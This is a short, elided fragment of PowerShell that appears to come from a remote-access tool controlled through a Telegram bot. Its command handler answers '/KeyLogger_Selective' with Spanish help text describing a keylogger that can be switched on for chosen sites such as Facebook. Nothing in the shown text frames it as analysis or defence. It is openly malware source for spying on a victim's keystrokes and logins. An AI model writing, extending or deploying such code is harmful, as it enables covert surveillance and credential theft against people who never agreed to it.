...
function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
 ...
 if ($comando -eq "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva. Ejemplo: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
